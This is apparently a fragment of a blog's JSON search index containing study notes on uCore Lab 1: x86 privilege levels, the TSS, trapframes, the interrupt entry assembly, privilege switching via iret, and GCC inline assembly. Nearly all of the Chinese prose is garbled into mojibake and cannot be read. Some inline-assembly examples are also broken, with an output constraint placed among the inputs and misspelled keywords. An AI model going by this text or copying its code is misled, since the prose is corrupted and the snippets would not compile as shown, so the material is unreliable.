1","uri":"/ucore-lab-1/#å®ç°"},{"categories":["Pwning"],"content":"ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°è°ƒç”¨ ç³»ç»Ÿè°ƒç”¨ï¼šä½¿ç”¨intå’Œiretï¼Œæœ‰å †æ ˆåˆ‡æ¢å’Œç‰¹æƒçº§çš„åˆ‡æ¢ï¼ˆå†…æ ¸å †æ ˆå’Œç”¨æˆ·å †æ ˆä¸åŒï¼‰ å‡½æ•°è°ƒç”¨ï¼šä½¿ç”¨callå’Œretï¼Œæ²¡æœ‰å †æ ˆå’Œç‰¹æƒçº§çš„åˆ‡æ¢ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç³»ç»Ÿè°ƒç”¨ä¸å‡½æ•°è°ƒç”¨"},{"categories":["Pwning"],"content":"ç³»ç»Ÿè°ƒç”¨å¼€é”€ï¼š è¶…è¿‡å‡½æ•°è°ƒç”¨ å¼•å¯¼æœºåˆ¶ï¼Œç”¨æˆ·åˆ°å†…æ ¸ å»ºç«‹å†…æ ¸å †æ ˆ éªŒè¯å‚æ•° å†…æ ¸æ€æ˜ å°„åˆ°ç”¨æˆ·æ€çš„åœ°å€ç©ºé—´ï¼Œæ›´æ–°é¡µé¢æ˜ å°„æƒé™ å†…æ ¸ç‹¬ç«‹åœ°å€ç©ºé—´ï¼ŒTLBå˜åŒ– ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç³»ç»Ÿè°ƒç”¨å¼€é”€"},{"categories":["Pwning"],"content":"ç‰¹æƒçº§ç‰¹æƒçº§å…±åˆ†ä¸ºå››æ¡£ï¼Œåˆ†åˆ«ä¸º0-3ï¼Œå…¶ä¸­Kernelä¸ºç¬¬0ç‰¹æƒçº§ï¼ˆring 0ï¼‰ï¼Œç”¨æˆ·ç¨‹åºä¸ºç¬¬3ç‰¹æƒçº§ï¼ˆring 3ï¼‰ï¼Œç³»ç»Ÿç¨‹åºåˆ†åˆ«ä¸ºç¬¬1å’Œç¬¬2ç‰¹æƒçº§ã€‚ ç‰¹æƒçº§çš„åŒºåˆ« ä¸€äº›æŒ‡ä»¤ï¼ˆä¾‹å¦‚ç‰¹æƒæŒ‡ä»¤lgdtï¼‰åªèƒ½è¿è¡Œåœ¨ring 0ä¸‹ã€‚ CPUåœ¨å¦‚ä¸‹æ—¶åˆ»ä¼šæ£€æŸ¥ç‰¹æƒçº§ è®¿é—®æ•°æ®æ®µ è®¿é—®é¡µ è¿›å…¥ä¸­æ–­æœåŠ¡ä¾‹ç¨‹ï¼ˆISRsï¼‰ â€¦ å¦‚æœæ£€æŸ¥å¤±è´¥ï¼Œåˆ™ä¼šäº§ç”Ÿä¿æŠ¤å¼‚å¸¸ï¼ˆGeneral Protection Faultï¼‰ ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç‰¹æƒçº§"},{"categories":["Pwning"],"content":"TSSç®€ä»‹TSSï¼Œå³ Task State Segmentï¼Œæ„ä¸ºä»»åŠ¡çŠ¶æ€æ®µï¼ŒTSS æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒç”¨äºå­˜å‚¨ä»»åŠ¡çš„ç¯å¢ƒã€‚TSS æ˜¯æ¯ä¸ªä»»åŠ¡éƒ½æœ‰çš„ç»“æ„ï¼Œå®ƒç”¨äºä¸€ä¸ªä»»åŠ¡çš„æ ‡è¯†ï¼Œç›¸å½“äºä»»åŠ¡çš„èº«ä»½è¯ï¼Œç¨‹åºæ‹¥æœ‰æ­¤ç»“æ„æ‰èƒ½è¿è¡Œï¼Œè¿™æ˜¯å¤„ç†å™¨ç¡¬ä»¶ä¸Šç”¨äºä»»åŠ¡ç®¡ç†çš„ç³»ç»Ÿç»“æ„ï¼Œå¤„ç†å™¨èƒ½å¤Ÿè¯†åˆ«å…¶ä¸­æ¯ä¸€ä¸ªå­—æ®µã€‚ å…¶ä¸­åŒ…å«äº†ä¸‰ä¸ªæ ˆæŒ‡é’ˆï¼Œåˆ†åˆ«ä¸ºring0ã€ring1ã€ring2çš„ç‰¹æƒæ ˆã€‚å½“ä½ç‰¹æƒçº§å‘é«˜ç‰¹æƒçº§è½¬æ¢çš„æ—¶å€™ï¼Œæ‰ä¼šç”¨åˆ°è¿™äº›æ ˆæŒ‡é’ˆè¿›è¡Œæ ˆçš„åˆ‡æ¢ã€‚åˆ‡æ¢å®Œæˆåï¼Œä½ç‰¹æƒçº§çš„æ ˆæŒ‡é’ˆä¼šè¢«ä¿å­˜åœ¨åˆ‡æ¢åçš„æ ˆä¸­ï¼Œé€šè¿‡retfæˆ–iretè¿”å›ã€‚å¹¶ä¸æ˜¯æ¯ä¸ªä»»åŠ¡éƒ½æœ‰ä¸‰ä¸ªæ ˆæŒ‡é’ˆï¼Œå› ä¸ºè¿™äº›æ ˆæŒ‡é’ˆåªæœ‰ä½ç‰¹æƒçº§å‘é«˜ç‰¹æƒçº§è½¬ç§»æ—¶æ‰ä¼šç”¨åˆ°ï¼Œæ‰€ä»¥å¯¹äºæœ¬èº«å°±å¤„åœ¨ring2çš„ç¨‹åºæ˜¯æ²¡æœ‰ring2çš„æ ˆæŒ‡é’ˆçš„ï¼Œå…¶ä»–åŒç†ã€‚åˆ‡æ¢æ ˆçš„æ“ä½œä»å¼€å§‹ä¸­æ–­çš„é‚£ä¸€ç¬é—´å°±å·²å®Œæˆã€‚ TSS æ˜¯ç¡¬ä»¶æ”¯æŒçš„ç³»ç»Ÿæ•°æ®ç»“æ„ï¼Œå®ƒå’ŒGDT ç­‰ä¸€æ ·ï¼Œç”±è½¯ä»¶å¡«å†™å…¶å†…å®¹ï¼Œç”±ç¡¬ä»¶ä½¿ç”¨ã€‚GDT ä¹Ÿè¦åŠ è½½åˆ°å¯„å­˜å™¨ GDTR ä¸­æ‰èƒ½è¢«å¤„ç†å™¨æ‰¾åˆ°ï¼ŒTSSä¹Ÿæ˜¯ä¸€æ ·ï¼Œå®ƒæ˜¯ç”± TRï¼ˆTask Registerï¼‰å¯„å­˜å™¨åŠ è½½çš„ï¼Œæ¯æ¬¡å¤„ç†å™¨æ‰§è¡Œä¸åŒä»»åŠ¡æ—¶ï¼Œå°†TRå¯„å­˜å™¨åŠ è½½ä¸åŒä»»åŠ¡çš„TSSå°±æˆäº†ã€‚ Code:mmu.h /* task state segment format (as described by the Pentium architecture book) */ struct taskstate { uint32_t ts_link; // old ts selector uintptr_t ts_esp0; // stack pointers and segment selectors uint16_t ts_ss0; // after an increase in privilege level uint16_t ts_padding1; uintptr_t ts_esp1; uint16_t ts_ss1; uint16_t ts_padding2; uintptr_t ts_esp2; uint16_t ts_ss2; uint16_t ts_padding3; uintptr_t ts_cr3; // page directory base uintptr_t ts_eip; // saved state from last task switch uint32_t ts_eflags; uint32_t ts_eax; // more saved state (registers) uint32_t ts_ecx; uint32_t ts_edx; uint32_t ts_ebx; uintptr_t ts_esp; uintptr_t ts_ebp; uint32_t ts_esi; uint32_t ts_edi; uint16_t ts_es; // even more saved state (segment selectors) uint16_t ts_padding4; uint16_t ts_cs; uint16_t ts_padding5; uint16_t ts_ss; uint16_t ts_padding6; uint16_t ts_ds; uint16_t ts_padding7; uint16_t ts_fs; uint16_t ts_padding8; uint16_t ts_gs; uint16_t ts_padding9; uint16_t ts_ldt; uint16_t ts_padding10; uint16_t ts_t; // trap on task switch uint16_t ts_iomb; // i/o map base address }; ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#tssç®€ä»‹"},{"categories":["Pwning"],"content":"DPLã€RPLã€CPLã€IOPLé¦–å…ˆè¦æ˜ç¡®ä¸€ç‚¹ï¼Œåœ¨è®¡ç®—æœºä¸­å…·å¤‡â€œèƒ½åŠ¨æ€§â€çš„åªæœ‰è®¡ç®—æœºæŒ‡ä»¤ï¼Œåªæœ‰æŒ‡ä»¤æ‰å…·å¤‡è®¿é—®ã€è¯·æ±‚å…¶ä»–èµ„æºçš„èƒ½åŠ›ï¼ŒæŒ‡ä»¤ä¾¿æ˜¯èµ„æºçš„è¯·æ±‚è€…ã€‚æŒ‡ä»¤â€œè¯·æ±‚â€ã€â€œè®¿é—®â€å…¶ä»–èµ„æºçš„èƒ½åŠ›ç­‰çº§ä¾¿ç§°ä¹‹ä¸ºè¯·æ±‚ç‰¹ æƒçº§ï¼ŒæŒ‡ä»¤å­˜æ”¾åœ¨ä»£ç æ®µä¸­ï¼Œæ‰€ä»¥ï¼Œå°±ç”¨ä»£ç æ®µå¯„å­˜å™¨ CS ä¸­é€‰æ‹©å­çš„ RPL ä½è¡¨ç¤ºä»£ç è¯·æ±‚åˆ«äººèµ„æºèƒ½åŠ›çš„ç­‰çº§ã€‚ DPLï¼Œå³ Descriptor Privilege Levelï¼Œæè¿°ç¬¦ç‰¹æƒçº§ï¼Œå®ƒå­˜åœ¨äºæ®µæè¿°ç¬¦ä¸­ã€‚æ ‡è¯†äº†è®¿é—®è¯¥æ®µçš„é—¨æ§›ã€‚ CPLï¼ŒCurrent Privilege Levelï¼Œå®ƒè¡¨ç¤ºå¤„ç†å™¨æ­£åœ¨æ‰§è¡Œçš„ä»£ç çš„ç‰¹æƒçº§åˆ«ã€‚å®ƒä¸å½“å‰æ®µçš„DPLæ˜¯ç›¸åŒçš„ã€‚ RPLï¼Œè¯·æ±‚ç‰¹æƒçº§ï¼Œæ¥è‡ªå‘å‡ºè¯·æ±‚çš„CS.RPLã€‚ IOPLï¼Œè¯¥ä½å­˜åœ¨äºeflagså­—æ®µä¸­ã€‚æŒ‡å½“å‰è¿è¡Œä»»åŠ¡çš„I/Oç‰¹æƒçº§(I/O privilege level)ï¼Œæ­£åœ¨è¿è¡Œä»»åŠ¡çš„å½“å‰ç‰¹æƒçº§(CPL)å¿…é¡»å°äºæˆ–ç­‰äºI/Oç‰¹æƒçº§æ‰èƒ½å…è®¸è®¿é—®I/Oåœ°å€ç©ºé—´ã€‚è¿™ä¸ªåŸŸåªèƒ½åœ¨CPLä¸º0æ—¶æ‰èƒ½é€šè¿‡POPFä»¥åŠIRETæŒ‡ä»¤ä¿®æ”¹ã€‚ å¯¹äºå—è®¿è€…ä¸ºæ•°æ®æ®µï¼ˆæ®µæè¿°ç¬¦ä¸­ type å­—æ®µä¸­æœªæœ‰Xå¯æ‰§è¡Œå±æ€§ï¼‰æ¥è¯´ï¼š åªæœ‰è®¿é—®è€…çš„æƒé™å¤§äºç­‰äºè¯¥ DPL è¡¨ç¤ºçš„æœ€ä½æƒé™æ‰èƒ½å¤Ÿç»§ç»­è®¿é—®ï¼Œå¦åˆ™è¿è¿™ä¸ªé—¨æ§›éƒ½è¿ˆä¸è¿‡å»ã€‚æ¯”å¦‚ï¼ŒDPL ä¸º 1 çš„æ®µæè¿°ç¬¦ï¼Œåªæœ‰ç‰¹æƒçº§ä¸º 0ã€1 çš„è®¿é—®è€…æ‰æœ‰èµ„æ ¼è®¿é—®å®ƒæ‰€ä»£è¡¨çš„èµ„æºï¼Œç‰¹æƒä¸º 2ã€3 çš„è®¿é—®è€…ä¼šè¢« CPU æ‹’ä¹‹é—¨å¤–ã€‚ å¯¹äºå—è®¿è€…ä¸ºä»£ç æ®µï¼ˆæ®µæè¿°ç¬¦ä¸­ type å­—æ®µä¸­å«æœ‰Xå¯æ‰§è¡Œå±æ€§ï¼‰æ¥è¯´ï¼š åªæœ‰è®¿é—®è€…çš„æƒé™ç­‰äºè¯¥ DPL è¡¨ç¤ºçš„æœ€ä½æƒé™æ‰èƒ½å¤Ÿç»§ç»­è®¿é—®ï¼Œå³åªèƒ½å¹³çº§è®¿é—®ã€‚ä»»ä½•æƒé™å¤§äºæˆ–å°äºå®ƒçš„è®¿é—®è€…éƒ½å°†è¢« CPU æ‹’ä¹‹é—¨å¤–ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè‡ªé—®è‡ªç­”ä¹‹å‰å…ˆæ˜ç¡®ä¸€ä¸ªæ¦‚å¿µï¼Œå¯¹äºå—è®¿è€…ä¸ºä»£ç æ®µä¸€è¿™è¯´æ³•ï¼Œå®é™…ä¸Šæ˜¯æŒ‡å¤„ç†å™¨ä»å½“å‰è¿è¡Œçš„ä»£ç æ®µä¸Šè½¬ç§»åˆ°å—è®¿è€…è¿™ä¸ªç›®æ ‡ä»£ç æ®µä¸Šå»æ‰§è¡Œï¼Œå¹¶ä¸æ˜¯ è¯´æŠŠè¯¥ç›®æ ‡ä»£ç æ®µå½“æ•°æ®ä¸€æ ·è®¿é—®ï¼Œåœ¨çœŸå®ç‰©ç†æœºå™¨ä¸Šï¼Œä»£ç æ®µé€šå¸¸æƒ…å†µä¸‹æ˜¯ä¸è¢«å½“æˆæ•°æ®æ¥å¤„ç†çš„ï¼Œä½†ç¡®å®å¯ä»¥è¿™ä¹ˆåšï¼ˆè¯è¯´è™šæ‹Ÿæœºä¸­ä¼šæŠŠä»£ç å½“æˆæ•°æ®æ¥å¤„ç†ï¼‰ã€‚ å¯¹äºæ•°æ®æ®µå’Œä»£ç æ®µçš„è¦æ±‚ä¸åŒï¼Œåœ¨æ‰§è¡Œä»£ç æ—¶ï¼Œé«˜ç‰¹æƒçº§çš„ç¨‹åºå‡ ä¹ä¸ä¼šä¸»åŠ¨é™ä½è‡ªå·±çš„ç‰¹æƒçº§ï¼Œä¸­æ–­çš„è¿”å›é™¤å¤–ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#dplrplcpliopl"},{"categories":["Pwning"],"content":"trapFrame trapframeç»“æ„æ˜¯è¿›å…¥ä¸­æ–­é—¨æ‰€å¿…é¡»çš„ç»“æ„ï¼Œå…¶ç»“æ„å¦‚ä¸‹ COPYstruct trapframe { // tf_regsä¿å­˜äº†åŸºæœ¬å¯„å­˜å™¨çš„å€¼ï¼ŒåŒ…æ‹¬eax,ebx,esi,ediå¯„å­˜å™¨ç­‰ç­‰ struct pushregs tf_regs; uint16_t tf_gs; uint16_t tf_padding0; uint16_t tf_fs; uint16_t tf_padding1; uint16_t tf_es; uint16_t tf_padding2; uint16_t tf_ds; uint16_t tf_padding3; uint32_t tf_trapno; // ä»¥ä¸‹è¿™äº›ä¿¡æ¯ä¼šè¢«CPUç¡¬ä»¶è‡ªåŠ¨å‹å…¥åˆ‡æ¢åçš„æ ˆã€‚åŒ…æ‹¬ä¸‹é¢åˆ‡æ¢ç‰¹æƒçº§æ‰€ä½¿ç”¨çš„espã€ssç­‰æ•°æ® uint32_t tf_err; uintptr_t tf_eip; uint16_t tf_cs; uint16_t tf_padding4; uint32_t tf_eflags; // ä»¥ä¸‹è¿™äº›ä¿¡æ¯ä¼šåœ¨åˆ‡æ¢ç‰¹æƒçº§æ—¶è¢«ä½¿ç”¨ uintptr_t tf_esp; uint16_t tf_ss; uint16_t tf_padding5; } __attribute__((packed)); ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#trapframe"},{"categories":["Pwning"],"content":"ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£ä»£ç  ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£ä»£ç ç”¨äºä¿å­˜ä¸Šä¸‹æ–‡å¹¶æ„å»ºä¸€ä¸ªtrapframeï¼Œå…¶æºä»£ç å¦‚ä¸‹ï¼š COPY #include \u003cmemlayout.h\u003e # vectors.S sends all traps here. .text .globl __alltraps __alltraps: # push registers to build a trap frame # therefore make the stack look like a struct trapframe pushl %ds pushl %es pushl %fs pushl %gs pushal # load GD_KDATA into %ds and %es to set up data segments for kernel movl $GD_KDATA, %eax movw %ax, %ds movw %ax, %es # push %esp to pass a pointer to the trapframe as an argument to trap() pushl %esp # call trap(tf), where tf=%esp call trap # pop the pushed stack pointer popl %esp # return falls through to trapret... .globl __trapret __trapret: # restore registers from stack popal # restore %ds, %es, %fs and %gs popl %gs popl %fs popl %es popl %ds # get rid of the trap number and error code addl $0x8, %esp iret ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„å…¥å£ä»£ç "},{"categories":["Pwning"],"content":"åˆ‡æ¢ç‰¹æƒçº§çš„è¿‡ç¨‹","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#åˆ‡æ¢ç‰¹æƒçº§çš„è¿‡ç¨‹"},{"categories":["Pwning"],"content":"ç‰¹æƒçº§æå‡å½“é€šè¿‡é™·å…¥é—¨ä»ring3åˆ‡æ¢è‡³ring0ï¼ˆç‰¹æƒæå‡ï¼‰ æ—¶ åœ¨é™·å…¥çš„ä¸€ç¬é—´ï¼ŒCPUä¼šå› ä¸ºç‰¹æƒçº§çš„æ”¹å˜ï¼Œç´¢å¼•TSSï¼Œåˆ‡æ¢sså’Œespä¸ºå†…æ ¸æ ˆï¼Œå¹¶æŒ‰é¡ºåºè‡ªåŠ¨å‹å…¥user_ssã€user_espã€user_eflagsã€user_csã€old_eipä»¥åŠerrã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCPUå…ˆåˆ‡æ¢åˆ°å†…æ ¸æ ˆï¼Œæ­¤æ—¶çš„espä¸ssä¸å†æŒ‡å‘ç”¨æˆ·æ ˆã€‚ä½†æ­¤æ—¶CPUå´å¯ä»¥å†å°†ç”¨æˆ·æ ˆåœ°å€å­˜å…¥å†…æ ¸æ ˆã€‚è¿™ç§æ“ä½œå¯èƒ½æ˜¯ä¾èµ–ç¡¬ä»¶æ¥å®Œæˆçš„ã€‚ å¦‚æœæ²¡æœ‰errï¼Œåˆ™CPUä¼šè‡ªåŠ¨å‹å…¥0ã€‚ ä¹‹åCPUä¼šåœ¨ä¸­æ–­å¤„ç†ä¾‹ç¨‹å…¥å£å¤„ï¼Œå…ˆå°†å‰©ä½™çš„æ®µå¯„å­˜å™¨ä»¥åŠæ‰€æœ‰çš„é€šç”¨å¯„å­˜å™¨å‹æ ˆï¼Œæ„æˆä¸€ä¸ªtrapframeã€‚ç„¶åå°†è¯¥trapframeä¼ å…¥ç»™çœŸæ­£çš„ä¸­æ–­å¤„ç†ä¾‹ç¨‹å¹¶æ‰§è¡Œã€‚ è¯¥å¤„ç†ä¾‹ç¨‹ä¼šåˆ¤æ–­ä¼ å…¥çš„ä¸­æ–­æ•°(trapno)å¹¶æ‰§è¡Œç‰¹å®šçš„ä»£ç ã€‚åœ¨æå‡ç‰¹æƒçº§çš„ä»£ç ä¸­ï¼Œç¨‹åºä¼šå¤„ç†ä¼ å…¥çš„trapframeä¿¡æ¯ä¸­çš„CSã€DSã€eflagså¯„å­˜å™¨ï¼Œä¿®æ”¹ä¸Šé¢çš„DPLã€CPLä¸IOPLä»¥è¾¾åˆ°æå‡ç‰¹æƒçš„ç›®çš„ã€‚ å°†ä¿®æ”¹åçš„trapframeå‹å…¥ç”¨æˆ·æ ˆï¼ˆè¿™ä¸€æ­¥æ²¡æœ‰ä¿®æ”¹user_espå¯„å­˜å™¨ï¼‰ï¼Œå¹¶è®¾ç½®ä¸­æ–­å¤„ç†ä¾‹ç¨‹ç»“æŸåå°†è¦å¼¹å‡ºespå¯„å­˜å™¨çš„å€¼ä¸ºç”¨æˆ·æ ˆçš„æ–°åœ°å€ï¼ˆä¸åˆšåˆšä¸åŒï¼Œè¿™ä¸€æ­¥ä¿®æ”¹äº†å°†è¦æ¢å¤çš„user_espå¯„å­˜å™¨ï¼‰ã€‚ æ³¨æ„æ­¤æ—¶çš„ç”¨æˆ·æ ˆåœ°å€æŒ‡å‘çš„æ˜¯ä¿®æ”¹åçš„trapframeã€‚ è¿™æ ·åœ¨é€€å‡ºä¸­æ–­å¤„ç†ç¨‹åºï¼Œå‡†å¤‡æ¢å¤ä¸Šä¸‹æ–‡çš„æ—¶å€™ï¼Œé¦–å…ˆå¼¹å‡ºçš„æ ˆå¯„å­˜å™¨å€¼æ˜¯ä¿®æ”¹åçš„ç”¨æˆ·æ ˆåœ°å€ï¼Œå…¶æ¬¡å¼¹å‡ºçš„é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ç­‰ç­‰éƒ½æ˜¯å­˜å‚¨äºç”¨æˆ·æ ˆä¸­çš„trapframeã€‚ ä¸ºä»€ä¹ˆè¦åšè¿™ä¹ˆå¥‡æ€ªçš„æ“ä½œå‘¢ï¼Ÿ å› ä¸ºæ¢å¤espå¯„å­˜å™¨çš„æŒ‡ä»¤åªæœ‰ä¸€æ¡pop %esp (å½“å‰ç¯å¢ƒä¸‹çš„iretæŒ‡ä»¤ä¸ä¼šå¼¹å‡ºæ ˆåœ°å€)ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸­æ–­å¤„ç†ä¾‹ç¨‹ç»“æŸï¼Œæ¢å¤espå¯„å­˜å™¨åï¼ŒespæŒ‡å‘çš„è¿˜æ˜¯å†…æ ¸æ ˆã€‚ ä½†æˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ‡æ¢å›ç”¨æˆ·æ ˆï¼Œåˆ™æ­¤æ—¶åªèƒ½ä¿®æ”¹åŸå…ˆè¦æ¢å¤çš„espå€¼ï¼Œé€šè¿‡è¯¥æŒ‡ä»¤åˆ‡æ¢åˆ°ç”¨æˆ·æ ˆã€‚ æ€è€ƒä¸€ä¸‹ï¼Œè¿›å…¥ä¸­æ–­å¤„ç†ç¨‹åºå‰ï¼Œä¸Šä¸‹æ–‡ä¿å­˜åœ¨å†…æ ¸æ ˆã€‚ä½†å°†è¦æ¢å¤å›ä¸Šä¸‹æ–‡çš„æ•°æ®å´å­˜å‚¨äºç”¨æˆ·æ ˆã€‚ åœ¨å†…æ ¸ä¸­ï¼Œå°†ä¿®æ”¹åçš„``trapframeå‹å…¥ç”¨æˆ·æ ˆè¿™ä¸€æ­¥ï¼Œéœ€è¦èˆå¼ƒtrapframeä¸­æœ«å°¾ä¸¤ä¸ªæ—§çš„sså’Œespå¯„å­˜å™¨æ•°æ®ï¼Œå› ä¸ºiret`æŒ‡ä»¤çš„ç‰¹æ®Šæ€§ï¼š iretæŒ‡ä»¤çš„åŠŸèƒ½å¦‚ä¸‹ iretæŒ‡ä»¤ä¼šæŒ‰é¡ºåºä¾æ¬¡å¼¹å‡ºeipã€csä»¥åŠeflagçš„å€¼åˆ°ç‰¹å®šå¯„å­˜å™¨ä¸­ï¼Œç„¶åä»æ–°çš„cs:ipå¤„å¼€å§‹æ‰§è¡Œã€‚å¦‚æœç‰¹æƒçº§å‘ç”Ÿæ”¹å˜ï¼Œåˆ™è¿˜ä¼šåœ¨å¼¹å‡ºeflagåå†ä¾æ¬¡å¼¹å‡ºespä¸sså¯„å­˜å™¨å€¼ã€‚ ç”±äºiretå‰åç‰¹æƒçº§ä¸å‘ç”Ÿæ”¹å˜ï¼ˆ[ä¸­æ–­ä¸­]ring0 -\u003e ring0 [ä¸­æ–­å]ï¼‰ï¼Œæ•…iretæŒ‡ä»¤ä¸ä¼šå¼¹å‡ºespå’Œsså¯„å­˜å™¨å€¼ã€‚å¦‚æœè¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¹Ÿè¢«å¤åˆ¶è¿›ç”¨æˆ·æ ˆï¼Œåˆ™ç›¸æ¯”äºè¿›å…¥ä¸­æ–­å‰çš„ç”¨æˆ·æ ˆåœ°å€ï¼Œespæœ€ç»ˆä¼šæŠ¬é«˜8ä¸ªå­—èŠ‚ï¼Œå¯èƒ½é€ æˆå¾ˆä¸¥é‡çš„é”™è¯¯ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç‰¹æƒçº§æå‡"},{"categories":["Pwning"],"content":"ç‰¹æƒçº§é™ä½é€šè¿‡é™·å…¥é—¨ä»ring0åˆ‡æ¢è‡³ring3ï¼ˆç‰¹æƒé™ä½ï¼‰ çš„è¿‡ç¨‹ä¸ç‰¹æƒæå‡çš„æ“ä½œåŸºæœ¬ä¸€æ ·ï¼Œä¸è¿‡æœ‰å‡ ä¸ªä¸åŒç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ ä¸ring3è°ƒç”¨ä¸­æ–­ä¸åŒï¼Œå½“ring0è°ƒç”¨ä¸­æ–­æ—¶ï¼Œè¿›å…¥ä¸­æ–­å‰å’Œè¿›å…¥ä¸­æ–­åçš„è¿™ä¸ªè¿‡ç¨‹ï¼Œæ ˆä¸å‘ç”Ÿæ”¹å˜ã€‚ å› ä¸ºåœ¨è°ƒç”¨ä¸­æ–­å‰çš„æƒé™å·²ç»å¤„äºring0äº†ï¼Œè€Œä¸­æ–­å¤„ç†ç¨‹åºé‡Œçš„æƒé™ä¹Ÿæ˜¯ring0ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥é™·å…¥æ“ä½œçš„ç‰¹æƒçº§æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œæ•…ä¸éœ€è¦è®¿é—®TSSå¹¶é‡æ–°è®¾ç½®ss ã€espå¯„å­˜å™¨ã€‚ ä¿®æ”¹åçš„trapFrameä¸éœ€è¦åƒä¸Šé¢é‚£æ ·ä¿å­˜è‡³å°†è¦ä½¿ç”¨çš„æ ˆï¼Œå› ä¸ºå½“å‰ç¯å¢ƒä¸‹iretå‰åç‰¹æƒçº§ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰§è¡Œè¯¥å‘½ä»¤ä¼šå¼¹å‡ºsså’Œespï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡iretæ¥è®¾ç½®è¿”å›æ—¶çš„æ ˆåœ°å€ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#ç‰¹æƒçº§é™ä½"},{"categories":["Pwning"],"content":"Cå‡½æ•°è°ƒç”¨çš„å®ç° C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (ä¸€) C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ) ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#cå‡½æ•°è°ƒç”¨çš„å®ç°"},{"categories":["Pwning"],"content":"GCCå†…è”æ±‡ç¼–åœ¨cè¯­è¨€ä¸­æ’å…¥æ±‡ç¼–ä»£ç ï¼Œå®Œæˆcè¯­è¨€æ— æ³•åšåˆ°çš„æŒ‡ä»¤ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#gccå†…è”æ±‡ç¼–"},{"categories":["Pwning"],"content":"Syntax asm(assembler template :output operands (optional) :input operands (optional) :clobbers (optional) ); ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#syntax"},{"categories":["Pwning"],"content":"Example 1å¯¹äºï¼š movl $0xffff, %eax è½¬åŒ–ä¸ºï¼š asm(\"movl $0xffff, %%eax\\n\"); ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-1"},{"categories":["Pwning"],"content":"Example 2å¯¹äºï¼š movl %cr0, %ebx movl %ebx, 12(%esp) orl $-2147483648, 12(%esp) movl 12(%esp), %eax movl %eax, %cr0 è½¬åŒ–ä¸ºï¼š uint32_t cr0; asm volatile (\"movl %%cr0, %0\\n\": \"=r\"(cr0)); cr0 |= 0x80000000; asm volatile (\"movl %0, %%cr0\\n\":: \"=r\"(cr0)); volatileï¼šä¸éœ€è¦ä¼˜åŒ–ï¼Œä¸éœ€è¦è°ƒæ•´é¡ºåº %0ï¼šç¬¬ä¸€ä¸ªç”¨åˆ°çš„å¯„å­˜å™¨ rï¼šä»»æ„å¯„å­˜å™¨ ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-2"},{"categories":["Pwning"],"content":"Example 3å¯¹äºï¼š movl $11, %eax movl -28(%ebp), %ebx movl -24(%ebp), %ecx movl -20(%ebp), %edx movl -16(%ebp), %esi int $0x80 movl %edi, -12(%ebp) è½¬åŒ–ä¸ºï¼š long_res, arg1 = 2, arg2 = 22, arg3 = 222, arg4 = 233; _asm_volatile(\"int $0x80\" :\"=a\"(_res) :\"0\"(11), \"b\"(arg1), \"c\"(arg2), \"d\"(arg3), \"S\"(arg4)); a = %eax b = %ebx c = %ecx d = %edx S = %esi D = %edi ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-3"},{"categories":["Pwning"],"content":"Lab 1:","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#lab-1"},{"categories":["Pwning"],"content":"ç»ƒä¹ 